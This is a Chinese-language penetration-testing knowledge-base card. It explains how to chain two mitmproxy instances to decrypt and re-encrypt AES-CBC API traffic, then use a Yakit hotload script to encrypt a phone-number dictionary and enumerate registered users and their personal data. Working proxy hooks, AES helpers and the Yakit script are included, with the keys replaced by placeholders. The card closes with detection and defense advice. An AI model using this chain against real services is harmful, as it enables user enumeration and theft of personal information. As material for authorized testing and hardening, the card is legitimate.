---
id: tools-burp-mitmproxy-dual-chain-aes-cbc-yakit-hotload-phone-bruteforce
title: mitmproxy 上下游双代理链把 AES-CBC 加密接口还原成明文，再用 Yakit 热加载 codec.AESCBCEncryptWithPKCS7Padding + x"{{payload(phone)}}" fuzztag 批量加密字典爆破手机号
type: scenario
domain: tools
path: tools/burp
technique: mitmproxy-dual-proxy-aes-cbc-autodecrypt-yakit-hotload-bruteforce
tags:
- tools
- mitmproxy
- yakit
- burp
- aes
- aes-cbc
- base64
- hotload
- bruteforce
- encrypted-traffic
- api-security
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W6
  verified_at: '2026-11-09T00:30:42+08:00'
  notes: 已对照原文核对；四段 mitmproxy 钩子、mitmdump 启动参数、Yakit 热加载脚本与爆破结论均与正文一致，card 内 key/iv 已占位化；本次核对未读取图片，15 张截图（代理配置、明密文对比、热加载调试与爆破结果）未读图核对。爆破成功的最终危害仅在正文文字与图中体现，未独立复现；未执行文中脚本、未访问文中 URL
url: /docs/tools/burp/tools-burp-mitmproxy-dual-chain-aes-cbc-yakit-hotload-phone-bruteforce/
draft: false
kb_aliases:
- mitmproxy 双层代理加解密
- 上下游 mitmdump 脚本链
- 加密接口明文化
- Yakit 热加载加密爆破
- codec.AESCBCEncryptWithPKCS7Padding
- fuzztag payload 加密字典
- 加密场景下的暴力破解
---

## 一句话结论

当前端把请求体整体 AES-CBC（PKCS7 + base64）加密后，「改包/爆破」在代理里看不到字段；用两层 `mitmdump` 组成一条「下游代理解密请求 → 中间工具（Yakit/Burp）看明文改包 → 上游代理重新加密并加密响应/解密响应」的链，就能在中间工具里按明文操作；若只是批量枚举（如手机号字典），进一步用 Yakit 热加载在发包前对每个字典值调用 `codec.AESCBCEncryptWithPKCS7Padding` + `codec.EncodeBase64` 现场加密，配合 `x"{{payload(phone)}}"` 取出 fuzztag 字典值，一次请求模板产出整批密文包，最终枚举出已注册手机号并读到其敏感信息。

## 原理

- 加密接口的明文只存在于浏览器 JS 与服务端进程内，代理层看到的是 `{"data":"<base64 密文>"}`。字段级测试（越权 id、爆破手机号）必须先解密再加密，否则服务端直接解密失败或语义被破坏。
- 单层代理只能解一侧：`mitmdump -s decrypt.py` 把浏览器发来的密文解成明文转给中间工具，但中间工具发出的明文不能直接到服务端，所以再加一层 `--mode upstream:http://127.0.0.1:8083/` 的代理，让中间工具的出口流量先经过上游代理重新加密。第二层用 `mitmdump -p 8989 -s aes_encrypt.py` 启动，中间工具的上游代理填它。
- 请求与响应各需要两个方向的脚本，共四个钩子：下游 `request`（解密浏览器→中间工具）、上游 `request`（加密中间工具→服务端）、上游 `response`（解密服务端→中间工具）、下游 `response`（加密中间工具→浏览器）。响应的下游加密是让浏览器能正常渲染，否则页面拿到的 JSON 里 `data` 是明文对象会报错。
- 脚本按 URL 前缀白名单生效（如 `/xxx/xxx/xxx` 与 `/iccm/h5/visitor/`），未命中的流量原样透传，避免把整站流量搅乱；所有钩子用 `try/except: pass` 包住，解密失败就放行原始字节，防止一处格式不符导致全站不可用。
- 爆破侧的关键是「加密发生在发包前」：Yakit 热加载脚本在字典替换阶段拿到 `phone`，自行拼 JSON、AES-CBC 加密、base64，再包成 `{"data": ...}` 返回列表，等于把「字典 × 加密」的笛卡尔积在本地一次生成，不需要中间工具支持加密算法。

## 触发条件

- 目标前端把业务字段整体加密（此处为 AES-CBC/PKCS7 + base64），且密钥与 IV 硬编码在可读的前端 JS 里（搜 `encrypt` 等关键词可直接定位 `key`/`iv`/`padding`）。
- 请求/响应结构固定为 `{"data": "<密文>"}` 之类的单字段包装，便于脚本整包替换；若加密字段分散在多个键中需逐个处理。
- 有可用的中间代理层（Yakit/Burp）与 mitmproxy 环境；代理端口、上游代理模式配置正确，HTTPS 需 `--ssl-insecure` 且浏览器信任 mitmproxy CA。
- 业务侧存在可枚举标识（手机号、用户 ID）且不同注册状态的响应有差异（如已注册返回资料、未注册提示完善信息），否则爆破没有判别依据。
- 枚举行为未做频率限制/验证码/风控；此为授权测试前提，禁止对未授权目标使用。

## 利用步骤

1. 抓一个加密请求，确认请求体是单字段密文；在前端 JS 中搜索 `encrypt`，得到算法、模式、padding 与硬编码 `key`/`iv`（16 字节）。
2. 写本地加解密工具函数（Python `Crypto.Cipher.AES`，`MODE_CBC`，手写 PKCS7 填充与去填充，密文先 `base64.b64decode`），先离线验证「解密出的明文 = 抓包时页面填的内容」，确认密钥/IV/模式正确。
3. 启下游代理：`mitmdump -q -p 8888 -s aes_decrypt.py --mode upstream:http://127.0.0.1:8083/ --ssl-insecure`，`request` 钩子取 `data` 字段解密后写回 `flow.request.content`；浏览器代理指向 8888。
4. 启上游代理：`mitmdump -q -p 8989 -s aes_encrypt.py`，`request` 钩子把中间工具发出的明文 JSON 重新 `json.dumps` 后加密，包成 `{"data": 密文}`；中间工具的上游代理填 8989。
5. 补两个 `response` 钩子：上游代理把服务端响应的 `data` 解密后合并回 JSON 交给中间工具；下游代理把中间工具返回的明文重新加密给浏览器，保证页面正常渲染。
6. 在中间工具里此时看到的是明文请求/响应，先人工确认改字段（如换手机号）后服务端仍正常响应，证明链路双向可用。
7. 批量枚举：在 Yakit 热加载中定义函数，读取字典 `phoneDict = x"{{payload(phone)}}"`，对每个 `phone` 拼 `{"verifyCode":"","phone":phone}` → `codec.AESCBCEncryptWithPKCS7Padding(key, jsonInput, iv)` → `codec.EncodeBase64` → `{"data": base64Result}`，追加进列表并返回；把请求体设为该函数的返回，字典设为手机号段/号段拼接。
8. 发包后按响应长度/关键字/是否含资料字段筛选，命中即为已注册手机号；抽样人工复核，确认泄露的是该用户的真实敏感信息（收货地址、订单等），并评估影响面与限速。

## PoC

解密/加密工具（离线验证用）：

```python
from Crypto.Cipher import AES
import base64

def aes_encrypt(plaintext, key, iv):
    plaintext = plaintext.encode('utf-8')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pad = AES.block_size - len(plaintext) % AES.block_size
    plaintext += bytes([pad] * pad)
    return base64.b64encode(cipher.encrypt(plaintext)).decode('utf-8')

def aes_decrypt(ciphertext, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(base64.b64decode(ciphertext))
    return plaintext[:-plaintext[-1]].decode('utf-8')
```

下游代理解密请求（浏览器 → 中间工具）：

```python
import json
from mitmproxy.http import HTTPFlow
from decrypt import aes_decrypt2

def request(flow: HTTPFlow):
    try:
        if "/xxx/xxx/xxx" in flow.request.url:
            data = json.loads(flow.request.content.decode())
            if data:
                flow.request.content = aes_decrypt2(data['data']).encode()
    except Exception:
        pass
```

上游代理重新加密请求（中间工具 → 服务端）：

```python
def request(flow: HTTPFlow):
    try:
        if "/xxx/xxx/xxx" in flow.request.url:
            data = json.loads(flow.request.content.decode())
            if data:
                encrypt_text = aes_encrypt2(str(json.dumps(data)))
                flow.request.content = json.dumps({'data': encrypt_text},
                                                  ensure_ascii=False).encode()
    except Exception:
        pass
```

响应方向同理：上游代理的 `response` 钩子解密 `data` 合并回 JSON，下游代理的 `response` 钩子把明文重新加密，页面才能渲染。

Yakit 热加载批量加密字典：

```
dncryptAesCbc = func(p) {
  key = "<16 字节硬编码 key>"
  iv  = "<16 字节硬编码 iv>"
  resultList = []
  phoneDict = x"{{payload(phone)}}"
  for phone in phoneDict {
    m = {"verifyCode":"","phone":phone}
    jsonInput = json.dumps(m)
    result = codec.AESCBCEncryptWithPKCS7Padding(key, jsonInput, iv)~
    base64Result = codec.EncodeBase64(result)
    resultList.Append({"data": base64Result})
  }
  return resultList
}
```

## 变体与关联

- 代理组合变体：只用上游代理改请求、不关心响应渲染；或中间工具换成 Burp，由 Burp 插件加解密（见 [[tools-burp-encrypted-api-proxy-decrypt-resign]]），mitmproxy 只做透传；也可用单层 mitmproxy + 本地加解密脚本人工改包。
- 算法变体：AES-ECB（无 IV、可重放同块）、DES、RSA 包裹 AES 密钥、密文再套签名；只需替换脚本中的加解密函数，链路结构不变。
- 爆破实现变体：加密在中间工具侧完成（插件热加载/双层脚本）、在 Yakit 热加载中完成（本卡）、或用外部脚本生成整包后由工具回放；也可把字典替换点放在明文 JSON 内部字段上，由上游代理统一加密。
- 关联：[[web-generic-auth-sekiro-jsrpc-yakit-hotload-rensign-batch]]（JS 运行时签名 + 热加载批量重签）、[[web-generic-auth-hybrid-rsa-aes-login-bruteforce]]（前后端混合加密下的登录爆破）、[[web-generic-auth-frontend-aes-ecb-hardcoded-key-student-id-pii-enumeration]]（同类硬编码密钥导致的 PII 枚举）。

## 检测与防御

- **服务端**：密钥/IV 不得下发到前端；把加密当传输层保护而非认证，接口仍需服务端鉴权、对象归属校验与越权校验；对手机号/用户 ID 类查询做登录态 + 一次性令牌绑定。
- **风控**：按 IP/设备/账号做频率限制与滑动窗口，对枚举特征（同一接口短时间大量不同 phone、响应码分布集中）触发验证码或封禁；对已注册/未注册返回统一文案与相近响应时间，消除枚举 oracle。
- **检测**：代理类客户端特征（mitmproxy CA 指纹、`Proxy-Connection`/TLS 指纹异常）、单个会话内上百次结构相同的密文请求、请求体密文长度恒定且随字典变化。
- **客户端加固边界**：JS 混淆/白盒仅提高还原成本，代理侧仍可完整复现加解密；真正的防护必须落在服务端授权与风控。
